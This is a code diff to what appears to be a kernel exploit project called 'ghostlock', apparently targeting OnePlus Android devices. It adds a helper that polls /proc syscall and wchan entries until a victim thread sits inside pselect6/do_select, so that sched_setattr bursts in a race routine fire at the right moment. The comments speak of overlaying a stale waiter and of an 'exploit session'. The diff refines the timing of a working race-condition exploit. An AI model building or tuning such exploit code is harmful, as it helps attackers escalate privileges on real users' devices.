@@ -80,6 +80,64 @@ namespace {
             snprintf(dst + used, cap - used, " wchan=?");
         }
     }
+
+    /* CLI-proven firing discipline (ghostlock-oneplus main.c:194): before the
+     * first sched_setattr of a seq, wait until the waiter provably entered
+     * select — /proc/<tid>/syscall == 72 (pselect6 on arm64; bionic select()
+     * wraps pselect6) AND wchan contains do_select, i.e. the fd_set copy is
+     * already on the kernel stack and the stale waiter is fully overlaid.
+     * Without this, the blind delay ladder can fire while the waiter is still
+     * in copy_from_user (chain reads half-written words) or before it entered
+     * select at all. On 800ms timeout fire anyway (best effort), like CLI. */
+    int32_t proc_first_int_of(const char *path) {
+        char buf[64] = {0};
+        const int fd = open(path, O_RDONLY | O_CLOEXEC);
+        if (fd < 0) return -1;
+        const ssize_t n = read(fd, buf, sizeof(buf) - 1);
+        close(fd);
+        if (n <= 0) return -1;
+        return static_cast<int32_t>(strtol(buf, nullptr, 10));
+    }
+
+    int waiter_ready_in_select(int32_t tid, long timeout_us,
+                               long *used_usec, int32_t *last_syscall) {
+        char path[48];
+        struct timespec t0, t1;
+        clock_gettime(CLOCK_MONOTONIC, &t0);
+        int32_t seen = -1;
+        int hit = 0;
+        long elapsed = 0;
+        snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
+        for (;;) {
+            seen = proc_first_int_of(path);
+            if (seen == 72 /* pselect6 */) {
+                char wpath[48];
+                char wbuf[64] = {0};
+                snprintf(wpath, sizeof(wpath), "/proc/self/task/%d/wchan", tid);
+                const int wfd = open(wpath, O_RDONLY);
+                int in_do_select = 0;
+                if (wfd >= 0) {
+                    const ssize_t n = read(wfd, wbuf, sizeof(wbuf) - 1);
+                    close(wfd);
+                    if (n > 0 && strstr(wbuf, "do_select") != nullptr)
+                        in_do_select = 1;
+                }
+                /* wchan=do_select => fd_set copy already on the kernel stack;
+                 * otherwise one 300us beat covers the copy window. */
+                if (!in_do_select) usleep(300);
+                hit = 1;
+            }
+            clock_gettime(CLOCK_MONOTONIC, &t1);
+            elapsed = static_cast<long>(
+                (t1.tv_sec - t0.tv_sec) * 1000000L +
+                (t1.tv_nsec - t0.tv_nsec) / 1000L);
+            if (hit || elapsed >= timeout_us) break;
+            usleep(20);
+        }
+        if (used_usec) *used_usec = elapsed;
+        if (last_syscall) *last_syscall = seen;
+        return hit;
+    }
 } // namespace
 
 namespace ghostlock::race {
@@ -195,7 +253,22 @@ namespace ghostlock::race {
             while (!race->consumer_stop.load() &&
                    race->consumer_go.load() == seq) {
                 uint32_t delay_usec = race->route_delay_usec.load();
-                if (delay_usec > 0) usleep(static_cast<useconds_t>(delay_usec));
+                if (calls_this_seq == 0) {
+                    /* v9: CLI-proven ready poll before the first fire — do
+                     * not sched_setattr until the waiter is provably inside
+                     * select (see waiter_ready_in_select note above). */
+                    long used_us = 0;
+                    int32_t last_sc = -1;
+                    const int ready = waiter_ready_in_select(
+                        tid, 800000, &used_us, &last_sc);
+                    pr_info("consumer poll-waiter seq=%d tid=%d ready=%d "
+                            "used_us=%ld last_syscall=%d\n",
+                            seq, tid, ready, used_us, last_sc);
+                    if (!ready && delay_usec > 0)
+                        usleep(static_cast<useconds_t>(delay_usec));
+                } else if (delay_usec > 0) {
+                    usleep(static_cast<useconds_t>(delay_usec));
+                }
                 for (uint32_t burst = 0;
                      burst < session::g_exploit_session.profile.select_consumer_burst_calls(); burst++) {
                     if (race->consumer_stop.load() ||
